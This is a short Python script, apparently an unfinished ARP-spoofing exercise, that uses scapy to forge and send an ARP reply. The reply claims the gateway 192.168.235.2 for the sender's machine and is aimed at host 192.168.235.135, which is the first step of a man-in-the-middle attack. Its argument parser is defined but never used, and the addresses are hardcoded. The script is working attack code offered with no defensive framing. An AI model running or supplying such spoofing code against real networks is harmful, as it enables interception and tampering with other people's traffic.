#!/usr/bin/env python

import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target", dest="target",help="Exact/Range of target IP addresses.")
    
    (options,arguments) = parser.parse_args()
    if not options.target:
        parser.error("Please provide target IP address/range(1/24).")
    return options

packet = scapy.ARP(op=2, pdst="192.168.235.135", hwdst="00:0c:29:ee:bd:60", psrc="192.168.235.2")
scapy.send(packet)